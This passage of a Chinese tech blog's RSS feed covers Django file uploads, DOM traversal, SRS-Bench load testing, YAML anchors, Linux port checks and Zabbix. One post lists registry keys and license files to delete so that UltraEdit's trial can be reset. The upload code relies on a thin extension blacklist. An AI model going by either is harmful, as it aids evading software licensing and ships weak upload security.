    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/api/upload&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
    &lt;span style=&#34;color:#75715e&#34;&gt;// 数据不需要编码，contentType 置假
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;contentType&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;processData&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
    &lt;span style=&#34;color:#75715e&#34;&gt;// 传递 FormData 数据
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileData&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-CSRFToken&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;csrftoken&lt;/span&gt; },
    &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10000&amp;#39;&lt;/span&gt;){
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;)
        }
    }
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4写入服务器保存&#34;&gt;4.写入服务器保存&lt;/h2&gt;
&lt;p&gt;通过 FormData 传递的文件数据，在服务器中可以通过 &lt;code&gt;request.FILES&lt;/code&gt; 获取，然后再根据属性获取到指定的 File 数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;file_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FILES
file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; file_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;avatar&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;编写函数，写入数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handle_uploaded_file&lt;/span&gt;(file):
    ext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ext &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;html&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;htm&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;js&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;css&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;php&amp;#39;&lt;/span&gt;]:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    file_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(uuid&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;uuid4()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex[:&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;], ext)
 
    &lt;span style=&#34;color:#75715e&#34;&gt;# file path relative to &amp;#39;media&amp;#39; folder&lt;/span&gt;
    absolute_file_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;main/media&amp;#39;&lt;/span&gt;, file_name)
 
    directory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dirname(absolute_file_path)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(directory):
        os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;makedirs(directory)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(absolute_file_path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb+&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; destination:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; chunk &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chunks():
            destination&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(chunk)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; file_name
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5文件的读取&#34;&gt;5.文件的读取&lt;/h2&gt;
&lt;p&gt;通过指定&lt;code&gt;MEDIA_URL MEDIA_ROOT&lt;/code&gt;的值，用户可以在前端读取上传的数据。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 在 setting.py 文件中写入如下配置&lt;/span&gt;
MEDIA_URL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/media/&amp;#39;&lt;/span&gt;
MEDIA_ROOT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(BASE_DIR, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;media&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 在 url.py 中配置路由&lt;/span&gt;
re_path(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;media/(?P&amp;lt;path&amp;gt;.*)$&amp;#39;&lt;/span&gt;,serve,{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;document_root&amp;#39;&lt;/span&gt;:settings&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MEDIA_ROOT}),
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;按上配置后，用户可以通过 &lt;code&gt;IP/media/文件名&lt;/code&gt; 来读取上传内容&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web开发—获取节点</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E8%8E%B7%E5%8F%96%E8%8A%82%E7%82%B9/</link>
        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E8%8E%B7%E5%8F%96%E8%8A%82%E7%82%B9/</guid>
        <description>&lt;h2 id=&#34;1通过获取-dom-方式直接获取子节点&#34;&gt;1.通过获取 dom 方式直接获取子节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;child&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByTagName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;div&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-通过-childnodes-获取子节点&#34;&gt;2. 通过 childNodes 获取子节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;child&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;childNodes&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3通过-children-来获取子节点&#34;&gt;3.通过 children 来获取子节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;child&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;children&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4通过-parentnode-获取父节点&#34;&gt;4.通过 parentNode 获取父节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;parentNode&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5通过获取父节点再获取子节点来获取兄弟节点&#34;&gt;5.通过获取父节点再获取子节点来获取兄弟节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;brother&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;parentNode&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;children&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6获取上一个兄弟节点&#34;&gt;6.获取上一个兄弟节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;brother&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;previousElementSibling&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7获取下一个兄弟节点&#34;&gt;7.获取下一个兄弟节点&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;brother&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;nextElementSibling&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—SRS-Bench 进行直播压力测试</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0srs-bench-%E8%BF%9B%E8%A1%8C%E7%9B%B4%E6%92%AD%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/</link>
        <pubDate>Sat, 22 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0srs-bench-%E8%BF%9B%E8%A1%8C%E7%9B%B4%E6%92%AD%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/</guid>
        <description>&lt;h2 id=&#34;1安装&#34;&gt;1.安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;github&lt;/strong&gt;：&lt;a class=&#34;link&#34; href=&#34;https://github.com/ossrs/srs-bench&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/ossrs/srs-bench&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/ossrs/srs-bench.git
cd srs-bench
yum install gcc unzip gcc+ gcc-c++
./configure &amp;amp;&amp;amp; make
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2flv-压测&#34;&gt;2.FLV 压测&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /srs-bench
git checkout master
./configure &amp;amp;&amp;amp; make
./objs/sb_http_load -c 200 -r httP://ip/1.flv
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—UltraEdit 试用数据清除</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0ultraedit-%E8%AF%95%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B8%85%E9%99%A4/</link>
        <pubDate>Sat, 22 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0ultraedit-%E8%AF%95%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B8%85%E9%99%A4/</guid>
        <description>&lt;h2 id=&#34;1版本2820092&#34;&gt;1.版本：28.20.0.92&lt;/h2&gt;
&lt;h3 id=&#34;a清理注册表键值&#34;&gt;a.清理注册表键值&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HKCU\SOFTWARE\Classes\WOW6432Node\CLSID\{9b4c79e8-d476-48e1-ad17-2253d0531ebb}
HKCU\SOFTWARE\Classes\WOW6432Node\CLSID\{bf2611c5-cf99-4e19-be15-83e593688709}
HKCU\SOFTWARE\Classes\WOW6432Node\CLSID\{c0bf323d-faa8-4b16-bdc9-92c6acb76dc1}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;b存储文件&#34;&gt;b.存储文件&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%userprofile%\AppData\Roaming\IDMComp\UltraEdit\license\uedit32_v.spl
%ProgramData%\IDMComp\UltraEdit\license\uedit32.spl
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—yaml 的锚点与引用</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0yaml-%E7%9A%84%E9%94%9A%E7%82%B9%E4%B8%8E%E5%BC%95%E7%94%A8/</link>
        <pubDate>Sat, 22 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0yaml-%E7%9A%84%E9%94%9A%E7%82%B9%E4%B8%8E%E5%BC%95%E7%94%A8/</guid>
        <description>&lt;h2 id=&#34;1yaml-的锚点--与引用-&#34;&gt;1.yaml 的锚点 &amp;amp; 与引用 *&lt;/h2&gt;
&lt;h3 id=&#34;a通过--合并内容&#34;&gt;a.通过 &amp;laquo; 合并内容&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;:
	&lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;db&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;book&lt;/span&gt;:
	&lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;db&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用锚点和引用配置后&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;localhost&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;&amp;amp;localhost1&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;:
	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;*localhost1&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;db&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;book&lt;/span&gt;:
	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;*localhost1&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;db&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中，&lt;code&gt;&amp;amp;&lt;/code&gt;表示将&lt;code&gt;localhost1&lt;/code&gt;作为&lt;code&gt;localhost&lt;/code&gt;的别名，&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;表示将&lt;code&gt;localhost1&lt;/code&gt;代表的&lt;code&gt;map&lt;/code&gt;合并入当前&lt;code&gt;map&lt;/code&gt;数据&lt;/p&gt;
&lt;h3 id=&#34;b通过--引用数据&#34;&gt;b.通过 * 引用数据&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;localhost&lt;/span&gt;: 
	&lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;&amp;amp;host&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;:
	&lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;*host&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;db&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;	
&lt;span style=&#34;color:#f92672&#34;&gt;book&lt;/span&gt;:
	&lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;*host&lt;/span&gt;
	&lt;span style=&#34;color:#f92672&#34;&gt;db&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—端口检查</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%9F%A5/</link>
        <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%9F%A5/</guid>
        <description>&lt;h2 id=&#34;1使用-lsof-检查&#34;&gt;1.使用 lsof 检查&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;lsof(list open files)&lt;/code&gt;是一个列出当前系统打开文件的工具，可以使用它来查看端口占用情况。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;lsof -i:端口号
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用-netstat-检查&#34;&gt;2.使用 netstat 检查&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;netstat -tunlp&lt;/code&gt; 用于显示 tcp，udp 的端口和进程等相关情况。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;netstat -tunlp | grep 端口号
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;-t (tcp) 仅显示tcp相关选项&lt;/li&gt;
&lt;li&gt;-u (udp)仅显示udp相关选项&lt;/li&gt;
&lt;li&gt;-n 拒绝显示别名，能显示数字的全部转化为数字&lt;/li&gt;
&lt;li&gt;-l 仅列出在Listen(监听)的服务状态&lt;/li&gt;
&lt;li&gt;-p 显示建立相关链接的程序名&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Zabbix—Agent 部署</title>
        <link>https://ac-lm.github.io/posts/zabbix/zabbixagent-%E9%83%A8%E7%BD%B2/</link>
        <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/zabbix/zabbixagent-%E9%83%A8%E7%BD%B2/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://www.zabbix.com/cn/download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;下载Zabbix&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1部署环境-centos7&#34;&gt;1.部署（环境 CentOS7）&lt;/h2&gt;
